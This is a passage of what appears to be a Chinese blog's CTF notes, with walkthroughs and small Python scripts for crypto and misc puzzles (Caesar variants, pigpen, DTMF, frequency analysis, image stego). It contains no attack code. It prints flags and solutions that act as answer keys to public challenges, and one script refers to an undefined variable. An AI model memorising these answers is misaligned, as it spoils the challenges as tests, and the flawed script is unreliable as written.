class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(img):</span><br><span class="line">        parser.error(<span class="string">&quot;image %s does not exist.&quot;</span> % img)</span><br><span class="line">    decode(ori, img, res, alpha)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">ori_path, img_path, res_path, alpha</span>):</span></span><br><span class="line">    ori = cv2.imread(ori_path)</span><br><span class="line">    img = cv2.imread(img_path)</span><br><span class="line">    ori_f = np.fft.fft2(ori)</span><br><span class="line">    img_f = np.fft.fft2(img)</span><br><span class="line">    height, width = ori.shape[<span class="number">0</span>], ori.shape[<span class="number">1</span>]</span><br><span class="line">    watermark = (ori_f - img_f) / alpha</span><br><span class="line">    watermark = np.real(watermark)</span><br><span class="line">    res = np.zeros(watermark.shape)</span><br><span class="line">    random.seed(height + width)</span><br><span class="line">    x = list(range(height // <span class="number">2</span>))</span><br><span class="line">    y = list(range(width))</span><br><span class="line">    random.shuffle(x)</span><br><span class="line">    random.shuffle(y)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(height // <span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(width):</span><br><span class="line">            res[x[i]][y[j]] = watermark[i][j]</span><br><span class="line">    cv2.imwrite(res_path, res, [int(cv2.IMWRITE_JPEG_QUALITY), <span class="number">100</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这次也是收获好多，就这个盲水印让我明白自己看报错信息的重要性。解决了问题是真的爽。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF题记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF题记————再战GK、BUU</title>
      <link href="/2020/08/23/CTF%E9%A2%98%E8%AE%B0%E2%80%94%E2%80%94%E5%86%8D%E6%88%98GK%E3%80%81BUU/"/>
      <url>/2020/08/23/CTF%E9%A2%98%E8%AE%B0%E2%80%94%E2%80%94%E5%86%8D%E6%88%98GK%E3%80%81BUU/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>没事做一些杂项和密码学的题，记下没见过的，总结思路。扩大脑洞。</p><h1 id="Crypto🍖"><a href="#Crypto🍖" class="headerlink" title="Crypto🍖"></a>Crypto🍖</h1><h2 id="GKCTF2020-汉字的秘密"><a href="#GKCTF2020-汉字的秘密" class="headerlink" title="[GKCTF2020]汉字的秘密"></a>[GKCTF2020]汉字的秘密</h2><p>这道题当时没做出来，做了一半。<br>下载下来的word文档，打不开，然后就010Editor看一下，发现是压缩包，改后缀解压。<br>出来一堆文件<br><img src="https://img-blog.csdnimg.cn/20200602225923778.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_RGV2b3Vy,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>当时做的时候，查到一篇博客(现在找不到了)，上面说这种题，信息一般都在document.xml中。然后就找<br>果然发现了信息，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">王壮 夫工 王中 王夫 由由井 井人 夫中 夫夫 井王 土土 夫由</span><br><span class="line">土夫 井中 士夫 王工 王人 土由 由口夫</span><br></pre></td></tr></table></figure><p>是当铺密码，然后进行转换是<br><img src="https://img-blog.csdnimg.cn/20200602230232491.png" alt="m0re" loading="lazy"><br>这串字符串确实不是flag，到这里我的思路就没有了，古典密码试了，看过wp后才明白是变异凯撒，之前还做过这种题，没想到害。<br>下面是简单脚本，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">m0re=<span class="string">&quot;EJ&gt;CvSHMV7G9R9@?3k&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> miwen:</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    flag+=chr(ord(a)+i)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>跑出来flag，转换成小写提交。</p><h2 id="MRCTF2020-古典密码知多少"><a href="#MRCTF2020-古典密码知多少" class="headerlink" title="[MRCTF2020]古典密码知多少"></a>[MRCTF2020]古典密码知多少</h2><p>没见过的标准银河字母，其他的两种很容易看出来是猪圈密码和圣堂武士密码。然后对照百度找到的标准银河字母对照表进行解码<br><img src="https://img-blog.csdnimg.cn/20200624224410808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>解出得到<code>FGCPFLIrtuASyoN</code><br><img src="https://img-blog.csdnimg.cn/20200624224608503.png" alt="m0re" loading="lazy"><br>所以进行栅栏解密<br><img src="https://img-blog.csdnimg.cn/20200624224808962.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>得到flag</p><h2 id="MRCTF2020-keyboard"><a href="#MRCTF2020-keyboard" class="headerlink" title="[MRCTF2020]keyboard"></a>[MRCTF2020]keyboard</h2><p><img src="https://img-blog.csdnimg.cn/2020062514334950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>看着键盘，也不是26键的，就是9键的，而且数字的位数不超过三。<br>数字是按键，个数是第几个字母。<br>得到flag是mobilephond<br>但是提交不对，改成mobilephone就对了。</p><h2 id="WUSTCTF2020-佛说：只能四天"><a href="#WUSTCTF2020-佛说：只能四天" class="headerlink" title="[WUSTCTF2020]佛说：只能四天"></a>[WUSTCTF2020]佛说：只能四天</h2><p>题目是与佛论禅，这个新的老的都试了一遍，新约佛论禅是可以解出来的。<br>在线解密网站🔑<a href="http://hi.pcmoe.net/buddha.html">新约佛论禅</a><br><img src="https://img-blog.csdnimg.cn/20200625144941850.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>然后是社会主义核心价值观编码<br>在线网站🔑<a href="http://ctf.ssleye.com/cvencode.html">传送门</a><br><img src="https://img-blog.csdnimg.cn/20200625145053769.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>最后doyouknowfence提示栅栏密码<br><img src="https://img-blog.csdnimg.cn/20200625145155710.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>最后凯撒密码，然后hint中是有提示的。<br><img src="https://img-blog.csdnimg.cn/20200625145240162.png" alt="m0re" loading="lazy"><br>凯撒最初是移三位的。所以直接偏移3位即可。<br>得到后查看符合base32编码，进行base32解密<br><img src="https://img-blog.csdnimg.cn/20200625145548998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"></p><h1 id="Misc🍔"><a href="#Misc🍔" class="headerlink" title="Misc🍔"></a>Misc🍔</h1><h2 id="GKCTF2020-code-obfuscation"><a href="#GKCTF2020-code-obfuscation" class="headerlink" title="[GKCTF2020]code obfuscation"></a>[GKCTF2020]code obfuscation</h2><p>这个二维码是扭曲的，扫描是扫不出来的，看别人的wp，都是用ps了，各种方法都有，不过，QR research可以扫描，但是直接扫描也是扫描不出来的，下面一个比较有意思的方法，就是打开这个图片，截图粘贴到一块大的白屏上，然后尽可能让图片看起来小，再用工具扫描，就可以扫出来了。<br><img src="https://img-blog.csdnimg.cn/20200602232642766.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_RGV2b3Vy,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>然后进行文件分离，在图片中分离出来一个压缩包，有密码的，然后gkctf应该是解压密码，不过要进行base编码，只能挨个尝试，最后base58加密出来是对的。解压结果，一张图片和一个文件<br><img src="https://img-blog.csdnimg.cn/20200602233117782.png" alt="m0re" loading="lazy"><br>在线工具js美化——<a href="https://tool.lu/js/">传送门</a>，直接将1文件拖进去，点击美化。</p><p><img src="https://img-blog.csdnimg.cn/2020060223331385.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_RGV2b3Vy,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>看了大佬的博客，emmm，多少还是有点不理解的地方。<br>整理得到</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> a b c d e f g h i j k l m n o p q r s t u v w x y z <span class="keyword">do</span> <span class="built_in">eval</span> An = <span class="string">&quot;n&quot;</span></span><br><span class="line">done</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> A B C D E F G H I J K L M N O P Q R S T U V W X Y Z <span class="keyword">do</span> <span class="built_in">eval</span> An = <span class="string">&quot;n&quot;</span></span><br><span class="line">done num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> a b c d e f g h i j <span class="keyword">do</span> <span class="built_in">eval</span> Bn = <span class="string">&quot;n&quot;</span></span><br><span class="line">num = $((num + <span class="number">1</span>))</span><br><span class="line">done alert(&quot;Bk=&#x27; &#x27;;Bm=&#x27;&quot;&#x27;;Bn=&#x27;#&#x27;;Bs=&#x27;(&#x27;;Bt=&#x27;)&#x27;;By=&#x27;.&#x27;;Cb=&#x27;&#x27;;Cc=&#x27;&lt;&#x27;;Ce=&#x27;&gt;&#x27;;Cl=&#x27;_&#x27;;Cn=&#x27;&#123;&#x27;;Cp=&#x27;&#125;&#x27;;Da=&#x27;0&#x27;;Db=&#x27;1&#x27;;Dc=&#x27;2&#x27;;Dd=&#x27;3&#x27;;De=&#x27;4&#x27;;Df=&#x27;5&#x27;;Dg=&#x27;6&#x27;;Dh=&#x27;7&#x27;;Di=&#x27;8&#x27;;Dj=&#x27;9&#x27;;&quot;)</span><br></pre></td></tr></table></figure><p>再用下大师傅的脚本跑一下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line">s = <span class="string">&quot;$Bn$Ai$An$Ac$Al$Au$Ad$Ae$Bk$Cc$As$At$Ad$Ai$Ao$By$Ah$Ce$Ai$An$At$Bk$Am$Aa$Ai$An$Bs$Bt$Cn$Ap$Ar$Ai$An$At$Bs$Bm$Aw$Dd$Al$Ac$Da$Am$Ae$Cl$De$Ao$Cl$Dj$Ak$Ac$At$Df$Bm$Bt$Cb$Ar$Ae$At$Au$Ar$An$Bk$Da$Cb$Cp&quot;</span></span><br><span class="line">ll = s.split(<span class="string">&#x27;$&#x27;</span>)</span><br><span class="line">list1 = [<span class="string">&#x27;Bk&#x27;</span>,<span class="string">&#x27;Bm&#x27;</span>,<span class="string">&#x27;Bn&#x27;</span>,<span class="string">&#x27;Bs&#x27;</span>,<span class="string">&#x27;Bt&#x27;</span>,<span class="string">&#x27;By&#x27;</span>,<span class="string">&#x27;Cb&#x27;</span>,<span class="string">&#x27;Cc&#x27;</span>,<span class="string">&#x27;Ce&#x27;</span>,<span class="string">&#x27;Cl&#x27;</span>,<span class="string">&#x27;Cn&#x27;</span>,<span class="string">&#x27;Cp&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Da&#x27;</span>,<span class="string">&#x27;Db&#x27;</span>,<span class="string">&#x27;Dc&#x27;</span>,<span class="string">&#x27;Dd&#x27;</span>,<span class="string">&#x27;De&#x27;</span>,<span class="string">&#x27;Df&#x27;</span>,<span class="string">&#x27;Dg&#x27;</span>,<span class="string">&#x27;Dh&#x27;</span>,<span class="string">&#x27;Di&#x27;</span>,<span class="string">&#x27;Dj&#x27;</span>]</span><br><span class="line">list2 = [<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>]</span><br><span class="line">list3 = []</span><br><span class="line">list4 = []</span><br><span class="line">s = string.ascii_lowercase</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">list3.append(<span class="string">&#x27;A%s&#x27;</span>%i)</span><br><span class="line">list4.append(i)</span><br><span class="line"><span class="comment">#print(list3,&#x27;\n&#x27;,list4)</span></span><br><span class="line"></span><br><span class="line">t = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(ll)):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,len(list1)):</span><br><span class="line"><span class="keyword">if</span> ll[i]==list1[j]:</span><br><span class="line">t += list2[j]</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">0</span>,len(list3)):</span><br><span class="line"><span class="keyword">if</span> ll[i]==list3[k]:</span><br><span class="line">t +=list4[k]</span><br><span class="line">print(t)</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200602234455619.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_RGV2b3Vy,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="GKCTF2020-Harley-Quinn"><a href="#GKCTF2020-Harley-Quinn" class="headerlink" title="[GKCTF2020]Harley Quinn"></a>[GKCTF2020]Harley Quinn</h2><p>下载得到音频文件和一张图片，听音频，听到最后面发现异常，也不知道是什么，也不是摩斯密码什么的，后来看hint是电话音，</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDIwLmNuYmxvZ3MuY29tL2Jsb2cvMTg5NzI2Ny8yMDIwMDYvMTg5NzI2Ny0yMDIwMDYwMzA4NDQyODA1OS0xMzUzNDQyNTM3LnBuZw?x-oss-process=image/format,png" alt="m0re" loading="lazy"></p><p>看了大佬的wp(这个比赛的时候我是没有做出来的，没有思路)<br>需要用到一个工具，<code>dtmf2num.exe</code><br>下载地址呢，emmm这个大佬他给了下载链接，可以去他博客里找链接，毕竟不好直接搬过来。——<a href="http://blog.ysneko.com/archives/166/">传送门</a><br>然后下载好啦之后，需要先将那个音频进行剪辑，把后面那段电话音剪出来，<br>可以选中电话音前面的所有部分，然后剪切掉</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDIwLmNuYmxvZ3MuY29tL2Jsb2cvMTg5NzI2Ny8yMDIwMDYvMTg5NzI2Ny0yMDIwMDYwMzA4NTYwMDAyOC0yMDQ2MTY3OTE3LnBuZw?x-oss-process=image/format,png" loading="lazy"></p><p>再导出文件就行了。<br>然后使用dtmf解题<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDIwLmNuYmxvZ3MuY29tL2Jsb2cvMTg5NzI2Ny8yMDIwMDYvMTg5NzI2Ny0yMDIwMDYwMzA4NTg0NTU3Ni01ODc1MTA4MTMucG5n?x-oss-process=image/format,png" loading="lazy"></p><p><code>#22283334447777338866#</code><br>九键</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDIwLmNuYmxvZ3MuY29tL2Jsb2cvMTg5NzI2Ny8yMDIwMDYvMTg5NzI2Ny0yMDIwMDYwMzA5MDAyMjk0NS00MDM5NzUzOTAucG5n?x-oss-process=image/format,png" loading="lazy"><br>是<code>ctfisfun</code><br>然后第二个hint是</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDIwLmNuYmxvZ3MuY29tL2Jsb2cvMTg5NzI2Ny8yMDIwMDYvMTg5NzI2Ny0yMDIwMDYwMzA5MDExMzY5NC0xMjg2NDIyOTY2LnBuZw?x-oss-process=image/format,png" loading="lazy"><br>工具吧，百度搜索就行。<br>然后打开使用，可能需要将原来的JPEG为后缀的图片改成jpg格式，</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDIwLmNuYmxvZ3MuY29tL2Jsb2cvMTg5NzI2Ny8yMDIwMDYvMTg5NzI2Ny0yMDIwMDYwMzA5MTMzMzE2NC04OTA2NjQyMjQucG5n?x-oss-process=image/format,png" loading="lazy"></p><p>输入密码，<code>ctfisfun</code><br>得到一个flag.txt</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDIwLmNuYmxvZ3MuY29tL2Jsb2cvMTg5NzI2Ny8yMDIwMDYvMTg5NzI2Ny0yMDIwMDYwMzA5MTQxODM0NS02OTkxMDcyNzMucG5n?x-oss-process=image/format,png" loading="lazy"></p><h2 id="GXYCTF2019-gakki"><a href="#GXYCTF2019-gakki" class="headerlink" title="[GXYCTF2019]gakki"></a>[GXYCTF2019]gakki</h2><p>foremost分离图片得到压缩包，然后是弱口令，8864（都是傻瓜式操作就不截图了）<br>解压出来flag.txt是<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDIwLmNuYmxvZ3MuY29tL2Jsb2cvMTg5NzI2Ny8yMDIwMDYvMTg5NzI2Ny0yMDIwMDYwOTE4NTUwNDU5OC0xMDIxNzYwNzM5LnBuZw?x-oss-process=image/format,png" alt="m0re" loading="lazy"><br>进行词频分析（这个应该就是考点）<br>官方给的脚本，这个在线网址有点力不从心。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># gakki_exp.py</span></span><br><span class="line"><span class="comment"># Author : imagin</span></span><br><span class="line">alphabet = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_+- =&#123;&#125;[]&quot;</span></span><br><span class="line">f = open(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">data = f.read()</span><br><span class="line">result = &#123;d:<span class="number">0</span> <span class="keyword">for</span> d <span class="keyword">in</span> alphabet&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sort_by_value</span>(<span class="params">d</span>):</span></span><br><span class="line">    items = d.items()</span><br><span class="line">    backitems = [[v[<span class="number">1</span>],v[<span class="number">0</span>]] <span class="keyword">for</span> v <span class="keyword">in</span> items]</span><br><span class="line">    backitems.sort(reverse=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> [ backitems[i][<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(backitems))]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">for</span> alpha <span class="keyword">in</span> alphabet:</span><br><span class="line">        <span class="keyword">if</span> d == alpha:</span><br><span class="line">            result[alpha] = result[alpha] + <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">print(sort_by_value(result))</span><br></pre></td></tr></table></figure><p>跑一遍得结果<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDIwLmNuYmxvZ3MuY29tL2Jsb2cvMTg5NzI2Ny8yMDIwMDYvMTg5NzI2Ny0yMDIwMDYwOTE4NTY0OTY3NS0xMjQzMjAyMjYyLnBuZw?x-oss-process=image/format,png" alt="m0re" loading="lazy"><br>flag{gaki_IsMyw1fe}</p><h2 id="SWPU2019-伟大的侦探"><a href="#SWPU2019-伟大的侦探" class="headerlink" title="[SWPU2019]伟大的侦探"></a>[SWPU2019]伟大的侦探</h2><p>解压得到密码文件，misc文件夹是空的，编码没见过，所以就百度了一下，然后发现这种编码可以使用010editor转换<br><img src="https://img-blog.csdnimg.cn/20200609193115550.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>转换就得到密码，再次解压得到图片<br><img src="https://img-blog.csdnimg.cn/20200609193202349.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>是跳舞的小人，百度寻找对照表<br>得到flag{iloveholmesandwllm}</p><h2 id="john-in-the-middle"><a href="#john-in-the-middle" class="headerlink" title="john-in-the-middle"></a>john-in-the-middle</h2><p>这个流量分析，追踪流没得到有用的信息，尝试导出http，然后看到了六张png图片。<br>使用stegsolve查看，在logo.png 中得到flag<br><img src="https://img-blog.csdnimg.cn/20200609202101219.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>flag{J0hn_th3_Sn1ff3r}<br>也有直接进行foremost分离得到图片的，两种方法均可。</p><h2 id="GXYCTF2019-SXMgdGhpcyBiYXNlPw"><a href="#GXYCTF2019-SXMgdGhpcyBiYXNlPw" class="headerlink" title="[GXYCTF2019]SXMgdGhpcyBiYXNlPw=="></a>[GXYCTF2019]SXMgdGhpcyBiYXNlPw==</h2><p>先解密这个题目，是base64，得到<code>Is this base?</code><br>然后打开压缩包后得到的flag.txt看到<br><img src="https://img-blog.csdnimg.cn/20200624232036477.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>虽然很多，但是还是进行了解码查看了一下，但是没找到有用的信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">Cette nuit,</span><br><span class="line">Intenable insomnie,</span><br><span class="line">La folie me guette,</span><br><span class="line">Je suis ce que je fuis</span><br><span class="line">Je subis,</span><br><span class="line">Cette cacophonie,</span><br><span class="line">Qui me scie la t锚te,</span><br><span class="line">Assommante harmonie,</span><br><span class="line">Elle me dit,</span><br><span class="line">Tu paieras tes delits,</span><br><span class="line">Quoi qu<span class="string">&#x27;il advienne,</span></span><br><span class="line"><span class="string">On tra卯ne ses cha卯nes,</span></span><br><span class="line"><span class="string">Ses peines,</span></span><br><span class="line"><span class="string">Je voue mes nuits,</span></span><br><span class="line"><span class="string">A l&#x27;</span>assasymphonie,</span><br><span class="line">Aux requiems,</span><br><span class="line">Tuant par depit,</span><br><span class="line">Ce que je seme,</span><br><span class="line">Je voue mes nuits,</span><br><span class="line">A l<span class="string">&#x27;assasymphonie,</span></span><br><span class="line"><span class="string">Et aux blasphemes,</span></span><br><span class="line"><span class="string">J&#x27;</span>avoue je maudis,</span><br><span class="line">Tous ceux qui s<span class="string">&#x27;aiment,</span></span><br><span class="line"><span class="string">L&#x27;</span>ennemi,</span><br><span class="line">Tapi dans mon esprit,</span><br><span class="line">F锚te mes defaites,</span><br><span class="line">Sans repit me defie,</span><br><span class="line">Je renie,</span><br><span class="line">La fatale heresie,</span><br><span class="line">Qui ronge mon 锚tre,</span><br><span class="line">Je veux rena卯tre,</span><br><span class="line">Rena卯tre,</span><br><span class="line">Je voue mes nuits,</span><br><span class="line">A l<span class="string">&#x27;assasymphonie,</span></span><br><span class="line"><span class="string">Aux requiems,</span></span><br><span class="line"><span class="string">Tuant par depit,</span></span><br><span class="line"><span class="string">Ce que je seme,</span></span><br><span class="line"><span class="string">Je voue mes nuits,</span></span><br><span class="line"><span class="string">A l&#x27;</span>assasymphonie,</span><br><span class="line">Et aux blasphemes,</span><br><span class="line">J<span class="string">&#x27;avoue je maudis,</span></span><br><span class="line"><span class="string">Tous ceux qui s&#x27;</span>aiment,</span><br><span class="line">Pleurent les violons de ma vie,</span><br><span class="line">La violence de mes envies,</span><br><span class="line">Siphonnee symphonie,</span><br><span class="line">Deconcertant concerto,</span><br><span class="line">Je joue sans toucher le Do,</span><br><span class="line">Mon talent sonne faux,</span><br><span class="line">Je noie mon ennui,</span><br><span class="line">Dans la melomanie,</span><br><span class="line">Je tue mes phobies,</span><br><span class="line">Dans la desharmonie,</span><br><span class="line">Je voue mes nuits,</span><br><span class="line">A l<span class="string">&#x27;assasymphonie,</span></span><br><span class="line"><span class="string">Aux requiems,</span></span><br><span class="line"><span class="string">Tuant par depit,</span></span><br><span class="line"><span class="string">Ce que je seme,</span></span><br><span class="line"><span class="string">Je voue mes nuits,</span></span><br><span class="line"><span class="string">A l&#x27;</span>assasymphonie,</span><br><span class="line">Et aux blasphemes,</span><br><span class="line">J<span class="string">&#x27;avoue je maudis,</span></span><br><span class="line"><span class="string">Tous ceux qui s&#x27;</span>aiment,</span><br><span class="line">Je voue mes nuits,</span><br><span class="line">A l<span class="string">&#x27;assasymphonie (l&#x27;</span>assasymphonie),</span><br><span class="line">J<span class="string">&#x27;avoue je maudis,</span></span><br><span class="line"><span class="string">Tous ceux qui 